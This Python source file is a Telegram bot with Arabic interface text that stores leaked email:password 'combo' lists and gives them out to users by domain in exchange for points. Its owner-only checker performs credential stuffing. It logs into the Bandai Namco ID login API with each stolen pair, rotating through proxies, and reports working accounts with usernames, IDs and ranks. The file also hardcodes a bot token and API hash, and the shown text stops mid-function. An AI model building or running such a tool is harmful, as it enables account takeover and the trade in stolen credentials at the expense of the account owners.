import subprocess
import sys

def install_packages():
    packages = ["requests", "beautifulsoup4", "pyrogram", "tgcrypto"]
    for package in packages:
        try:
            __import__(package)
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            except:
                pass

install_packages()

import os
import io
import re
import sqlite3
import uuid
import asyncio
import time
import random
import threading
import requests
import shutil
from datetime import datetime, date, timedelta
from collections import Counter
from pyrogram import Client, filters
from pyrogram.types import (
    Message, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, ChatMemberUpdated
)
from pyrogram.errors import FloodWait, UserNotParticipant
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== الإعدادات ====================
API_ID = 20084899
API_HASH = "a860b181d2f15d0473ee309523a9fc19"
BOT_TOKEN = "8839466034:AAF_ONFjOcoOSrcQtiTRrtWlTQJCDtR-Cxw"

OWNER_IDS = [8604513259, 7105884739]
DB_PATH = "combos.db"

WORK_DIR = os.path.dirname(os.path.abspath(__file__))
CHECKER_FILES_DIR = os.path.join(WORK_DIR, "checker_files")
CHECKER_PROXY_PATH = os.path.join(WORK_DIR, "checker_proxies.txt")
os.makedirs(CHECKER_FILES_DIR, exist_ok=True)

bot_enabled_for_users = True
user_action_state = {}
user_filter_keywords = {}
subscription_cache = {}

PASSWORD_REPLACEMENTS = ["Aa123456", "Aa123456@", "Aa123123", "Aa12341234", "Aa11223344", "Aa@123456"]

# متغيرات الفحص
checker_active = False
checker_lock = threading.Lock()
checker_proxy_list = []
checker_failed_proxies = set()
checker_results_lock = threading.Lock()
checker_stats = {'total': 0, 'checked': 0, 'valid': 0, 'invalid': 0, 'start_time': None}
counter_message_id = None

app = Client("combo_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ==================== قاعدة البيانات ====================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS combos (id INTEGER PRIMARY KEY AUTOINCREMENT, combo TEXT NOT NULL)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, points REAL DEFAULT 0, referred_by INTEGER DEFAULT NULL, is_blocked INTEGER DEFAULT 0, ban_reason TEXT DEFAULT NULL, total_withdrawals INTEGER DEFAULT 0, last_daily_claim TEXT DEFAULT NULL, streak_count INTEGER DEFAULT 0, level TEXT DEFAULT 'عادي', created_at TEXT DEFAULT CURRENT_TIMESTAMP)''')
    for col in ["ban_reason", "total_withdrawals", "last_daily_claim", "streak_count", "level", "created_at"]:
        try:
            cursor.execute(f"ALTER TABLE users ADD COLUMN {col} TEXT DEFAULT NULL" if col in ["ban_reason", "last_daily_claim", "created_at"] else f"ALTER TABLE users ADD COLUMN {col} INTEGER DEFAULT 0" if col == "total_withdrawals" else f"ALTER TABLE users ADD COLUMN {col} TEXT DEFAULT 'عادي'" if col == "level" else f"ALTER TABLE users ADD COLUMN {col} INTEGER DEFAULT 0")
        except:
            pass
    cursor.execute('''CREATE TABLE IF NOT EXISTS withdrawals (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, domain TEXT NOT NULL, amount INTEGER NOT NULL, points_spent REAL DEFAULT 0, created_at TEXT DEFAULT CURRENT_TIMESTAMP)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS channels (channel_id TEXT PRIMARY KEY, title TEXT DEFAULT 'قناة', invite_link TEXT DEFAULT NULL)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS ad_channels (channel_id TEXT PRIMARY KEY, points_reward REAL DEFAULT 1)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS ad_rewards (user_id INTEGER, channel_id TEXT, PRIMARY KEY (user_id, channel_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS gifts (code TEXT PRIMARY KEY, points REAL NOT NULL, used_by INTEGER DEFAULT NULL)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS search_stats (domain TEXT PRIMARY KEY, search_count INTEGER DEFAULT 0)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS waitlist (user_id INTEGER NOT NULL, domain TEXT NOT NULL, notified INTEGER DEFAULT 0, created_at TEXT DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (user_id, domain))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS bot_settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)''')
    cursor.execute("INSERT OR IGNORE INTO channels (channel_id, title, invite_link) VALUES ('-1003434964850', 'قناة البوت الرسمية', 'https://t.me/+91X31VNWIU1iNDM8')")
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.row_factory = sqlite3.Row
    return conn

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def ensure_user(user_id: int):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    if not cursor.fetchone():
        cursor.execute("INSERT INTO users (user_id, points, is_blocked) VALUES (?, 0, 0)", (user_id,))
        conn.commit()
    conn.close()

def get_user_points(user_id: int) -> float:
    ensure_user(user_id)
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT points FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return float(row["points"]) if row else 0.0

def add_user_points(user_id: int, points: float):
    ensure_user(user_id)
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET points = points + ? WHERE user_id = ?", (points, user_id))
    conn.commit()
    conn.close()

def deduct_user_points(user_id: int, points: float):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET points = MAX(0, points - ?) WHERE user_id = ?", (points, user_id))
    conn.commit()
    conn.close()

def get_user_row(user_id: int):
    ensure_user(user_id)
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row

def update_user_block_status(user_id: int, status: int, reason: str = None):
    conn = get_db()
    cursor = conn.cursor()
    if reason:
        cursor.execute("UPDATE users SET is_blocked = ?, ban_reason = ? WHERE user_id = ?", (status, reason, user_id))
    else:
        cursor.execute("UPDATE users SET is_blocked = ? WHERE user_id = ?", (status, user_id))
    conn.commit()
    conn.close()

def is_user_banned(user_id: int) -> tuple:
    row = get_user_row(user_id)
    if row and row["is_blocked"] == 1:
        return True, row["ban_reason"] or "محظور"
    return False, None

def get_setting(key: str, default: str = "") -> str:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM bot_settings WHERE key = ?", (key,))
    row = cursor.fetchone()
    conn.close()
    return row["value"] if row else default

def set_setting(key: str, value: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO bot_settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def increment_operations():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE bot_settings SET value = CAST(value AS INTEGER) + 1 WHERE key = 'total_operations'")
    conn.commit()
    conn.close()

def get_total_operations() -> int:
    return int(get_setting("total_operations", "0"))

def update_user_level(user_id: int):
    row = get_user_row(user_id)
    if not row:
        return
    points = float(row["points"])
    withdrawals = int(row["total_withdrawals"] or 0)
    new_level = "ذهبي" if points >= 100 or withdrawals >= 50 else "فضي" if points >= 30 or withdrawals >= 15 else "عادي"
    if new_level != row["level"]:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET level = ? WHERE user_id = ?", (new_level, user_id))
        conn.commit()
        conn.close()

def count_available_combos(domain: str) -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as c FROM combos WHERE LOWER(combo) LIKE ?", (f"%{domain.lower()}%",))
    count = cursor.fetchone()["c"]
    conn.close()
    return count

def extract_email_pass(line: str) -> str:
    line = line.strip()
    parts = line.split(':')
    if len(parts) >= 3:
        return f"{parts[-2]}:{parts[-1]}"
    if len(parts) == 2:
        return f"{parts[0]}:{parts[1]}"
    return line

async def fetch_and_delete_combos(domain: str, limit_count: int) -> list:
    def _db_op():
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT id, combo FROM combos WHERE LOWER(combo) LIKE ? LIMIT ?", (f"%{domain.lower()}%", int(limit_count * 2.5) + 1000))
        rows = cursor.fetchall()
        if not rows:
            conn.close()
            return []
        results = []
        ids_to_delete = []
        seen = set()
        for r in rows:
            if len(results) >= limit_count:
                break
            cleaned = extract_email_pass(r["combo"])
            if cleaned and cleaned not in seen:
                seen.add(cleaned)
                results.append(cleaned)
                ids_to_delete.append(r["id"])
        if ids_to_delete:
            placeholders = ",".join("?" * len(ids_to_delete))
            cursor.execute(f"DELETE FROM combos WHERE id IN ({placeholders})", ids_to_delete)
            conn.commit()
        conn.close()
        return results
    return await asyncio.to_thread(_db_op)

def add_combos_from_file(file_path: str) -> int:
    conn = get_db()
    cursor = conn.cursor()
    added = 0
    batch = []
    for enc in ['utf-8-sig', 'utf-8', 'latin-1', 'cp1252']:
        try:
            with open(file_path, "r", encoding=enc, errors="ignore") as f:
                for line in f:
                    line_str = line.strip()
                    if line_str and len(line_str) >= 3:
                        batch.append((line_str,))
                        if len(batch) >= 50000:
                            cursor.executemany("INSERT INTO combos (combo) VALUES (?)", batch)
                            conn.commit()
                            added += len(batch)
                            batch = []
            break
        except:
            continue
    if batch:
        cursor.executemany("INSERT INTO combos (combo) VALUES (?)", batch)
        conn.commit()
        added += len(batch)
    conn.close()
    return added

def get_stats():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as c FROM combos")
    total = cursor.fetchone()["c"]
    cursor.execute("SELECT COUNT(*) as c FROM users")
    total_users = cursor.fetchone()["c"]
    cursor.execute("SELECT COUNT(*) as c FROM users WHERE is_blocked = 1")
    blocked = cursor.fetchone()["c"]
    conn.close()
    return total, total_users, blocked

def delete_by_domain(domain: str) -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM combos WHERE LOWER(combo) LIKE ?", (f"%{domain.lower()}%",))
    count = cursor.rowcount
    conn.commit()
    conn.close()
    return count

def delete_all_combos():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM combos")
    conn.commit()
    conn.close()

def record_withdrawal(user_id: int, domain: str, amount: int, points_spent: float = 0):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO withdrawals (user_id, domain, amount, points_spent) VALUES (?, ?, ?, ?)", (user_id, domain, amount, points_spent))
    cursor.execute("UPDATE users SET total_withdrawals = total_withdrawals + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    update_user_level(user_id)

def log_search_domain(domain: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO search_stats (domain, search_count) VALUES (?, 1) ON CONFLICT(domain) DO UPDATE SET search_count = search_count + 1", (domain.lower(),))
    conn.commit()
    conn.close()

# ==================== دوال الفحص ====================
def normalize_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if '@' in proxy_str:
        if not proxy_str.startswith('http://'):
            proxy_str = 'http://' + proxy_str
        return proxy_str
    if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return proxy_str
    return 'http://' + proxy_str

def extract_user_info(html_content):
    user_data = {'username': None, 'account_id': None, 'player_rank': None, 'is_linked': False, 'has_game_data': False}
    soup = BeautifulSoup(html_content, 'html.parser')
    
    username_elem = soup.find('p', {'class': 'top-contents-user-info'})
    if username_elem:
        user_data['username'] = username_elem.get_text(strip=True)
    
    account_id_match = re.search(r'[A-Z0-9]{10,}', html_content)
    if account_id_match:
        user_data['account_id'] = account_id_match.group(0)
    
    rank_match = re.search(r'<dd><a>(\d+)</a></dd>', html_content)
    if rank_match:
        user_data['player_rank'] = rank_match.group(1)
    
    if 'No game account' in html_content or 'إجراءات الربط' in html_content:
        user_data['is_linked'] = False
    else:
        user_data['is_linked'] = True
    
    if user_data.get('is_linked'):
        username = user_data.get('username', '')
        if username and username.lower() not in ['not logged in', 'guest', '']:
            if user_data.get('player_rank'):
                user_data['has_game_data'] = True
        if user_data.get('account_id') and user_data.get('account_id') != '67829150454' and len(user_data.get('account_id', '')) >= 10:
            user_data['has_game_data'] = True
    
    return user_data

def perform_full_login(email, password, proxy=None):
    session = requests.Session()
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'Accept': "text/html,application/xhtml+xml",
        'accept-language': "ar-EG,ar;q=0.9",
    }
    
    try:
        main_url = "https://ww.bandainamcoentwebstore.com/opbr-ww/en"
        r1 = session.get(main_url, headers=headers, timeout=15)
        if r1.status_code != 200:
            return None
        
        login_url = "https://account-api.bandainamcoid.com/v3/login/idpw"
        payload = {
            'client_id': "FXpKtpYzmcZIH0d5R2AX2KwJmO8btruHY8yoZe2f",
            'redirect_uri': "https://ww.bandainamcoentwebstore.com/opbr-ww/en/callback",
            'login_id': email,
            'password': password,
            'retention': "1",
            'language': "ar",
        }
        
        r2 = session.post(login_url, data=payload, headers=headers, timeout=15)
        if r2.status_code != 200:
            return None
        
        login_json = r2.json()
        if login_json.get("result") != "OK":
            return None
        
        redirect_url = login_json.get("redirect")
        if redirect_url:
            session.get(redirect_url, headers=headers, timeout=15)
        
        time.sleep(0.5)
        
        r3 = session.get(main_url, headers=headers, timeout=15)
        if r3.status_code != 200:
            return None
        
        user_data = extract_user_info(r3.text)
        
        if user_data.get('has_game_data'):
            return {'email': email, 'password': password, 'user_data': user_data, 'is_valid': True}
        return None
    except:
        return None

def process_single_account_checker(email, password):
    result = perform_full_login(email, password, None)
    if result:
        return result
    proxy = None
    with checker_lock:
        available = [p for p in checker_proxy_list if p not in checker_failed_proxies]
        if available:
            proxy = random.choice(available)
    if proxy:
        result = perform_full_login(email, password, proxy)
        if result:
            return result
    return None

async def update_counter_message(client: Client, chat_id: int):
    global counter_message_id
    while checker_active:
        try:
            if checker_stats['total'] > 0:
                progress = (checker_stats['checked'] / checker_stats['total']) * 100
                elapsed = int(time.time() - checker_stats['start_time'])
                text = (
                    f"📊 <b>عداد الفحص</b>\n\n"
                    f"📁 الإجمالي: <b>{checker_stats['total']:,}</b>\n"
                    f"✅ تم الفحص: <b>{checker_stats['checked']:,}</b> ({progress:.1f}%)\n"
                    f"🎯 الصالحة: <b>{checker_stats['valid']:,}</b>\n"
                    f"❌ الفاشلة: <b>{checker_stats['invalid']:,}</b>\n"
                    f"⏱️ الوقت: <b>{elapsed} ثانية</b>"
                )
                if counter_message_id:
                    try:
                        await client.edit_message_text(chat_id, counter_message_id, text)
                    except:
                        pass
                else:
                    msg = await client.send_message(chat_id, text)
                    counter_message_id = msg.id
        except:
            pass
        await asyncio.sleep(60)  # تحديث كل دقيقة

async def run_checker(client: Client, chat_id: int):
    global checker_active, counter_message_id
    
    if checker_active:
        await client.send_message(chat_id, "⚠️ الفحص جاري بالفعل!")
        return
    
    combo_files = []
    if os.path.exists(CHECKER_FILES_DIR):
        for f in os.listdir(CHECKER_FILES_DIR):
            if f.endswith('.txt'):
                combo_files.append(os.path.join(CHECKER_FILES_DIR, f))
    
    if not combo_files:
        await client.send_message(chat_id, "❌ لا توجد ملفات حسابات!")
        return
    
    global checker_proxy_list, checker_failed_proxies
    checker_proxy_list = []
    checker_failed_proxies = set()
    if os.path.exists(CHECKER_PROXY_PATH):
        with open(CHECKER_PROXY_PATH, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    normalized = normalize_proxy(line)
                    if normalized:
                        checker_proxy_list.append(normalized)
    
    accounts = []
    for file_path in combo_files:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line and not line.startswith('#'):
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        accounts.append((parts[0].strip(), parts[1].strip()))
    
    if not accounts:
        await client.send_message(chat_id, "❌ لا توجد حسابات صالحة")
        return
    
    checker_active = True
    checker_stats['total'] = len(accounts)
    checker_stats['checked'] = 0
    checker_stats['valid'] = 0
    checker_stats['invalid'] = 0
    checker_stats['start_time'] = time.time()
    counter_message_id = None
    
    await client.send_message(chat_id, f"🚀 بدأ الفحص!\n📁 الملفات: <b>{len(combo_files)}</b>\n📊 الإجمالي: <b>{len(accounts):,}</b>")
    
    asyncio.create_task(update_counter_message(client, chat_id))
    
    batch_size = 15
    for batch_idx in range(0, len(accounts), batch_size):
        batch = accounts[batch_idx:batch_idx + batch_size]
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = {executor.submit(process_single_account_checker, email, pwd): (email, pwd) for email, pwd in batch}
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=60)
                    with checker_results_lock:
                        checker_stats['checked'] += 1
                        if result:
                            checker_stats['valid'] += 1
                            user_data = result['user_data']
                            message = (
                                f"✅ <b>حساب نشط</b>\n\n"
                                f"📧: <code>{result['email']}</code>\n"
                                f"🔑: <code>{result['password']}</code>\n"
                                f"👤: <code>{user_data.get('username', 'غير موجود')}</code>\n"
                                f"🆔: <code>{user_data.get('account_id', 'غير موجود')}</code>\n"
                                f"📊: <code>{user_data.get('player_rank', 'غير موجود')}</code>"
                            )
                            await client.send_message(chat_id, message)
                        else:
                            checker_stats['invalid'] += 1
                except:
                    with checker_results_lock:
                        checker_stats['checked'] += 1
                        checker_stats['invalid'] += 1
        time.sleep(1)
    
    checker_active = False
    elapsed = int(time.time() - checker_stats['start_time'])
    await client.send_message(chat_id, f"📊 <b>التقرير النهائي</b>\n\n📊 الإجمالي: <b>{checker_stats['total']:,}</b>\n✅ تم الفحص: <b>{checker_stats['checked']:,}</b>\n🎯 الصالحة: <b>{checker_stats['valid']:,}</b>\n❌ الفاشلة: <b>{checker_stats['invalid']:,}</b>\n⏱️ الوقت: <b>{elapsed} ثانية</b>")

# ==================== الكيبوردات ====================
def owner_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🔍 بحث عن دومين"), KeyboardButton("📂 فرز ملفات ULP")],
        [KeyboardButton("📤 رفع ملف ULP"), KeyboardButton("📊 الإحصائيات")],
        [KeyboardButton("🗑 حذف حسب دومين"), KeyboardButton("✅ تفعيل البوت")],
        [KeyboardButton("🚫 إغلاق البوت"), KeyboardButton("📈 حالة البوت")],
        [KeyboardButton("💣 حذف كل البيانات"), KeyboardButton("🔐 فحص الحسابات")]
    ], resize_keyboard=True)

def user_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🔍 بحث عن دومين")],
        [KeyboardButton("💰 رصيدي ونقاطي"), KeyboardButton("📋 آخر العمليات")],
        [KeyboardButton("🎁 المكافأة اليومية"), KeyboardButton("🔗 رابط الإحالة")]
    ], resize_keyboard=True)

# ==================== /start ====================
@app.on_message(filters.command("start"))
async def start_handler(client: Client, message: Message):
    user_id = message.from_user.id
    ensure_user(user_id)
    
    if is_owner(user_id):
        await message.reply("أهلاً بك في <b>بوت الكومبو</b>\n\nقناتي: https://t.me/+91X31VNWIU1iNDM8\nيوزري: @D3_1D", reply_markup=owner_keyboard())
    else:
        await message.reply("أهلاً بك في <b>بوت الكومبو</b>\n\nقناتي: https://t.me/+91X31VNWIU1iNDM8\nيوزري: @D3_1D", reply_markup=user_keyboard())

# ==================== أزرار الفحص ====================
@app.on_message(filters.regex("^🔐 فحص الحسابات$") & filters.user(OWNER_IDS))
async def checker_menu(client: Client, message: Message):
    combo_files_count = len([f for f in os.listdir(CHECKER_FILES_DIR) if f.endswith('.txt')]) if os.path.exists(CHECKER_FILES_DIR) else 0
    proxy_exists = "✅" if os.path.exists(CHECKER_PROXY_PATH) else "❌"
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ إضافة ملف حسابات", callback_data="add_combo_file")],
        [InlineKeyboardButton("🗑 حذف ملف محدد", callback_data="delete_specific_combo_file")],
        [InlineKeyboardButton("🗑 حذف كل الملفات", callback_data="delete_all_combo_files")],
        [InlineKeyboardButton("➕ إضافة ملف بروكسيات", callback_data="add_proxy_file")],
        [InlineKeyboardButton("🗑 حذف ملف البروكسيات", callback_data="delete_proxy_file")],
        [InlineKeyboardButton("🚀 بدء الفحص", callback_data="start_checker")],
        [InlineKeyboardButton("📊 حالة الفحص", callback_data="checker_status")],
        [InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_checker")]
    ])
    await message.reply(f"🔐 <b>قسم الفحص</b>\n\n📁 الملفات: <b>{combo_files_count}</b>\n🌐 البروكسي: {proxy_exists}", reply_markup=kb)

@app.on_callback_query(filters.regex("^add_combo_file$") & filters.user(OWNER_IDS))
async def add_combo_file_cb(client: Client, callback: CallbackQuery):
    user_action_state[callback.from_user.id] = "awaiting_checker_combo_file"
    await callback.answer("أرسل الملف")
    await callback.message.edit_text("📁 أرسل ملف الحسابات\nيمكنك إرسال أكثر من ملف")

@app.on_callback_query(filters.regex("^delete_specific_combo_file$") & filters.user(OWNER_IDS))
async def delete_specific_combo_file_cb(client: Client, callback: CallbackQuery):
    files = [f for f in os.listdir(CHECKER_FILES_DIR) if f.endswith('.txt')] if os.path.exists(CHECKER_FILES_DIR) else []
    if not files:
        await callback.answer("لا توجد ملفات", show_alert=True)
        return
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(f"🗑 {f}", callback_data=f"del_{f}")] for f in files])
    await callback.message.edit_text("اختر الملف:", reply_markup=kb)

@app.on_callback_query(filters.regex("^del_") & filters.user(OWNER_IDS))
async def del_specific_file_cb(client: Client, callback: CallbackQuery):
    filename = callback.data.replace("del_", "")
    filepath = os.path.join(CHECKER_FILES_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
    await callback.answer(f"تم حذف {filename}")
    files = [f for f in os.listdir(CHECKER_FILES_DIR) if f.endswith('.txt')] if os.path.exists(CHECKER_FILES_DIR) else []
    if files:
        kb = InlineKeyboardMarkup([[InlineKeyboardButton(f"🗑 {f}", callback_data=f"del_{f}")] for f in files])
        await callback.message.edit_text("اختر الملف:", reply_markup=kb)
    else:
        await callback.message.edit_text("🗑 تم حذف جميع الملفات")

@app.on_callback_query(filters.regex("^delete_all_combo_files$") & filters.user(OWNER_IDS))
async def delete_all_combo_files_cb(client: Client, callback: CallbackQuery):
    if os.path.exists(CHECKER_FILES_DIR):
        for f in os.listdir(CHECKER_FILES_DIR):
            if f.endswith('.txt'):
                os.remove(os.path.join(CHECKER_FILES_DIR, f))
    await callback.answer("تم حذف الكل")
    await callback.message.edit_text("🗑 تم حذف جميع ملفات الحسابات")

@app.on_callback_query(filters.regex("^add_proxy_file$") & filters.user(OWNER_IDS))
async def add_proxy_file_cb(client: Client, callback: CallbackQuery):
    user_action_state[callback.from_user.id] = "awaiting_checker_proxy_file"
    await callback.answer("أرسل الملف")
    await callback.message.edit_text("📁 أرسل ملف البروكسيات")

@app.on_callback_query(filters.regex("^delete_proxy_file$") & filters.user(OWNER_IDS))
async def delete_proxy_file_cb(client: Client, callback: CallbackQuery):
    if os.path.exists(CHECKER_PROXY_PATH):
        os.remove(CHECKER_PROXY_PATH)
        await callback.answer("تم الحذف")
        await callback.message.edit_text("🗑 تم حذف ملف البروكسيات")
    else:
        await callback.answer("لا يوجد ملف", show_alert=True)

@app.on_callback_query(filters.regex("^start_checker$") & filters.user(OWNER_IDS))
async def start_checker_cb(client: Client, callback: CallbackQuery):
    files = [f for f in os.listdir(CHECKER_FILES_DIR) if f.endswith('.txt')] if os.path.exists(CHECKER_FILES_DIR) else []
    if not files:
        await callback.answer("لا توجد ملفات!", show_alert=True)
        return
    await callback.answer("بدأ الفحص")
    await callback.message.edit_text("🚀 بدأ الفحص...")
    asyncio.create_task(run_checker(client, callback.message.chat.id))

@app.on_callback_query(filters.regex("^checker_status$") & filters.user(OWNER_IDS))
async def checker_status_cb(client: Client, callback: CallbackQuery):
    if checker_active:
        progress = (checker_stats['checked'] / checker_stats['total']) * 100 if checker_stats['total'] > 0 else 0
        text = (
            f"📊 <b>حالة الفحص</b>\n\n"
            f"📁 الإجمالي: <b>{checker_stats['total']:,}</b>\n"
            f"✅ تم الفحص: <b>{checker_stats['checked']:,}</b> ({progress:.1f}%)\n"
            f"🎯 الصالحة: <b>{checker_stats['valid']:,}</b>\n"
            f"❌ الفاشلة: <b>{checker_stats['invalid']:,}</b>"
        )
    else:
        text = "📊 لا يوجد فحص جاري"
    await callback.answer("تم")
    await callback.message.edit_text(text)

@app.on_callback_query(filters.regex("^stop_checker$") & filters.user(OWNER_IDS))
async def stop_checker_cb(client: Client, callback: CallbackQuery):
    global checker_active
    checker_active = False
    await callback.answer("تم إيقاف الفحص")
    await callback.message.edit_text("⏹ تم إيقاف الفحص")

@app.on_message(filters.document & filters.user(OWNER_IDS))
async def handle_files(client: Client, message: Message):
    user_id = message.from_user.id
    state = user_action_state.get(user_id)
    
    if state == "awaiting_checker_combo_file":
        try:
            temp_path = await message.download()
            filename = message.document.file_name or f"combo_{int(time.time())}.txt"
            target_path = os.path.join(CHECKER_FILES_DIR, filename)
            if os.path.exists(target_path):
                base, ext = os.path.splitext(filename)
                target_path = os.path.join(CHECKER_FILES_DIR, f"{base}_{int(time.time())}{ext}")
            shutil.copy2(temp_path, target_path)
            os.remove(temp_path)
            
            with open(target_path, 'r', encoding='utf-8', errors='ignore') as f:
                count = sum(1 for line in f if line.strip() and ':' in line)
            
            total_files = len([f for f in os.listdir(CHECKER_FILES_DIR) if f.endswith('.txt')])
            
            await message.reply(f"✅ تم حفظ: <b>{filename}</b>\n📊 الحسابات: <b>{count:,}</b>\n📂 إجمالي الملفات: <b>{total_files}</b>\n\nأرسل ملف آخر أو اضغط بدء الفحص")
        except Exception as e:
            await message.reply(f"❌ خطأ: {e}")
        return
    
    if state == "awaiting_checker_proxy_file":
        user_action_state.pop(user_id, None)
        try:
            temp_path = await message.download()
            shutil.copy2(temp_path, CHECKER_PROXY_PATH)
            os.remove(temp_path)
            with open(CHECKER_PROXY_PATH, 'r', encoding='utf-8', errors='ignore') as f:
                count = sum(1 for line in f if line.strip())
            await message.reply(f"✅ تم حفظ البروكسيات: <b>{count:,}</b>")
        except Exception as e:
            await message.reply(f"❌ خطأ: {e}")
        return
    
    if state == "awaiting_ulp_upload":
        user_action_state.pop(user_id, None)
        temp_path = None
        try:
            msg = await message.reply("⏳ جاري المعالجة...")
            temp_path = await message.download()
            added = await asyncio.to_thread(add_combos_from_file, temp_path)
            await msg.edit_text(f"✅ تمت الإضافة: <b>{added:,}</b>")
        except Exception as e:
            await message.reply(f"❌ خطأ: {e}")
        finally:
            if temp_path and os.path.exists(temp_path):
                os.remove(temp_path)

# ==================== الأزرار الإدارية ====================
@app.on_message(filters.regex("^📊 الإحصائيات$") & filters.user(OWNER_IDS))
async def show_stats(client: Client, message: Message):
    total, users, blocked = get_stats()
    await message.reply(f"📊 <b>الإحصائيات</b>\n\n• الكومبو: <b>{total:,}</b>\n• الأعضاء: <b>{users:,}</b>\n• المحظورين: <b>{blocked}</b>")

@app.on_message(filters.regex("^📈 حالة البوت$") & filters.user(OWNER_IDS))
async def bot_status(client: Client, message: Message):
    total, users, blocked = get_stats()
    await message.reply(f"📈 <b>الحالة</b>\n\n• الكومبو: <b>{total:,}</b>\n• الأعضاء: <b>{users:,}</b>\n• المحظورين: <b>{blocked}</b>\n• البوت: {'✅' if bot_enabled_for_users else '🚫'}")

@app.on_message(filters.regex("^✅ تفعيل البوت$") & filters.user(OWNER_IDS))
async def enable_bot(client: Client, message: Message):
    global bot_enabled_for_users
    bot_enabled_for_users = True
    await message.reply("✅ البوت مفعل")

@app.on_message(filters.regex("^🚫 إغلاق البوت$") & filters.user(OWNER_IDS))
async def disable_bot(client: Client, message: Message):
    global bot_enabled_for_users
    bot_enabled_for_users = False
    await message.reply("🚫 البوت مغلق")

@app.on_message(filters.regex("^💣 حذف كل البيانات$") & filters.user(OWNER_IDS))
async def wipe_data(client: Client, message: Message):
    delete_all_combos()
    await message.reply("💣 تم حذف كل الكومبوهات")

@app.on_message(filters.regex("^📤 رفع ملف ULP$") & filters.user(OWNER_IDS))
async def upload_ulp(client: Client, message: Message):
    user_action_state[message.from_user.id] = "awaiting_ulp_upload"
    await message.reply("📤 أرسل الملف للإضافة")

@app.on_message(filters.regex("^🗑 حذف حسب دومين$") & filters.user(OWNER_IDS))
async def ask_delete_domain(client: Client, message: Message):
    user_action_state[message.from_user.id] = "awaiting_delete_domain"
    await message.reply("🗑 أرسل الدومين:")

@app.on_message(filters.regex("^📂 فرز ملفات ULP$") & filters.user(OWNER_IDS))
async def start_ulp_filter(client: Client, message: Message):
    user_action_state[message.from_user.id] = "awaiting_filter_keywords"
    await message.reply("🎯 أرسل الكلمات المفتاحية للفرز:")

@app.on_message(filters.regex("^🔍 بحث عن دومين$"))
async def ask_domain(client: Client, message: Message):
    user_action_state[message.from_user.id] = "awaiting_search_domain"
    await message.reply("📝 أرسل الدومين:")

# ==================== معالجة النصوص ====================
@app.on_message(filters.text & ~filters.regex(r"^(🔍|📤|📊|🗑|✅|🚫|💣|📈|📂|🔐)"))
async def process_text(client: Client, message: Message):
    user_id = message.from_user.id
    state = user_action_state.get(user_id)
    text = message.text.strip()
    
    if state == "awaiting_search_domain":
        user_action_state.pop(user_id, None)
        domain = text.lower()
        available = count_available_combos(domain)
        if available == 0:
            await message.reply("❌ لا توجد حسابات")
            return
        if is_owner(user_id):
            results = await fetch_and_delete_combos(domain, available)
